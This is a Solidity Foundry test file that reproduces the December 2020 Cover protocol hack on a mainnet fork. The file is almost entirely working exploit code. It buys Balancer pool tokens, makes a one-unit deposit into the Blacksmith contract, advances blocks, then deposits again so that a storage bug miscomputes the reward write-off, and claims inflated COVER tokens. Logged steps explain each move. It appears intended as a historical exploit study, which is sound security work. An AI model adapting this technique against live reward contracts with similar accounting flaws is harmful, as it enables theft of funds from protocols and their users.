// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.6;
pragma abicoder v2;

import "forge-std/Test.sol";
import "cover-token-mining/Blacksmith.sol";
import "cover-token-mining/ERC20/IERC20.sol";
import "cover-token-mining/utils/SafeMath.sol";

interface IUniswapRouterV2 {
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IBPool is IERC20 {
    function joinswapExternAmountIn(
        address tokenIn,
        uint tokenAmountIn,
        uint minPoolAmountOut
    ) external returns (uint poolAmountOut);
}


/**
* This contract recreates the hack done by the Cover protocol hacker in December 2020 
* (https://etherscan.io/tx/0xca135d1c4268d6354a019b66946d4fbe4de6f7ddf0ff56389a5cc2ba695b035f).
* The BlacsmithHacker hacks the Blacksmith contract owned by Cover protocol.
* The contract gives out rewards in Cover tokens and we hack it to receive a very large amount of rewards.
 */

contract Hacker is Test {
    using SafeMath for uint256;

    // address of Blacksmith contract
    Blacksmith blackSmith = Blacksmith(0xE0B94a7BB45dD905c79bB1992C9879f40F1CAeD5);
    // Balancer Pool Token (BPT) used in hack
    IBPool BPT = IBPool(0x59686E01Aa841f622a43688153062C2f24F8fDed);
    // UniswapV2 Router 
    IUniswapRouterV2 router = IUniswapRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
    // DAI 
    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    // COVER TOKEN
    IERC20 COVER = IERC20(0x5D8d9F5b96f4438195BE9b99eee6118Ed4304286);

    uint256 private constant CAL_MULTIPLIER = 1e12;

    function test_StealCover() public{
        vm.createSelectFork("mainnet", 11_542_183);

        // get the BPT token to be used in staking on Blacksmith
        getBPT();
        uint256 BPTBalance = BPT.balanceOf(address(this));

        // step 1 log
        console.log("1. We swapped ether for %s DAI and then for %s BPT tokens.", 1 ether, BPTBalance);

        BPT.approve(address(blackSmith), type(uint).max);
        
        BPTBalance = BPTBalance.sub(1);

        // deposit 1 BPT token to enable us have a very low rewardWriteOff when we make the second deposit
        // BPT balance of Blacksmith before the deposit is 0
        blackSmith.deposit(address(BPT), 1);
        uint256 oldBlackSmith_BPTBalance = BPT.balanceOf(address(blackSmith));
        
        // step 2 logs
        console.log("2. We deposit 1 BPT into Blacksmith to make sure we can get a high accRewardsPerToken when we make the main deposit.");
        console.log("   The high accRewardsPerToken which is calculated when we make the second deposit is used to calculate the COVER reward.");
        console.log("   The low accRewardsPerToken calculated here is used to calculate our reward writeoff when we make our second deposit.");
        console.log("   Blacksmith is meant to use the high accRewardsPerToken to calculate the writeoff but uses the low one because of the storage bug.");

        // increased the blocks mined and block.timestamp to allow Blacksmith recalculate a new
        // Note: The original hacker had to wait for new blocks to be mined
        vm.roll(11542190); // mine 7 more blocks
        vm.warp(1609155416); // set the blocktimestamp

        // step 3
        console.log("3. Wait for  blocks to be mined so accRewardsPerToken can be recalculated when we deposit again.");

        (, uint256 currentAccRewardsPerToken, ) = blackSmith.pools(address(BPT));

        // deposit BPT tokens into Blacksmith and automatically earn a high reward since the current
        // pool's balance of BPT is 0.1 * 10^-17.
        // Because of the bug in the Blacksmith contract, our reward writeoff will be calculated 
        // using a small accRewardPerToken (the old one) instead of the new one (which is meant to be high).
        // Thus, the rewardWriteOff is very small. This allows us to withdraw more rewards than we actually earn.
        blackSmith.deposit(address(BPT), BPTBalance);
        (, uint256 newAccRewardsPerToken, ) = blackSmith.pools(address(BPT));
        (, uint256 rewardWriteOff, ) = blackSmith.miners(address(BPT), address(this));
        
        uint256 correctRewardWriteOff = (BPTBalance.mul(newAccRewardsPerToken).div(CAL_MULTIPLIER));

        // step 4 logs
        console.log("4. We deposited our BPT tokens into Blacksmith and our reward writeoff was calculated using %s instead of %s.", currentAccRewardsPerToken, newAccRewardsPerToken);
        console.log("   Current(Wrong) reward writeOff: %s", rewardWriteOff);
        console.log("   Correct reward writeOff: %s", correctRewardWriteOff);
        console.log("   The huge difference in reward writeoff is because of the difference in the amount of BPT tokens being deposited (%s)", BPTBalance.sub(1));
        console.log("   and the current amount in the pool (%s).", oldBlackSmith_BPTBalance);


        uint256 oldCoverBalance = COVER.balanceOf(address(this));
        // claim the inflated rewards
        blackSmith.claimRewards(address(BPT));
        uint256 newCoverBalance = COVER.balanceOf(address(this));

        // step 5 logs
        console.log("5. We claimed the inflated rewards from the Blacksmith contract.");
        console.log("   We were able to claim %s COVER tokens as rewards instead of %s.", newCoverBalance.sub(oldCoverBalance), 0);

        assertGt(newCoverBalance, oldCoverBalance, "Unable to steal cover tokens from Blacksmith");
    }

    function getBPT() internal{
        address[] memory amounts = new address[](2);
        amounts[0] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; // WETH
        amounts[1] = 0x6B175474E89094C44Da98b954EedeAC495271d0F; // DAI

        // get amount of ETH needed to get 1 DAI
        uint256 ethNeeded = router.getAmountsIn(
            1 ether, 
            amounts
        )[0];

        // swap ether for 1 DAI on Uniswap V2
        router.swapExactETHForTokens{value: ethNeeded}(
            1 ether,
            amounts, 
            address(this), 
            block.timestamp + 1
        );

        DAI.approve(address(BPT), type(uint256).max);

        // swap 1 DAI for the BPT tokens on Balancer
        BPT.joinswapExternAmountIn(address(DAI), 1 ether, 1);
    }
}
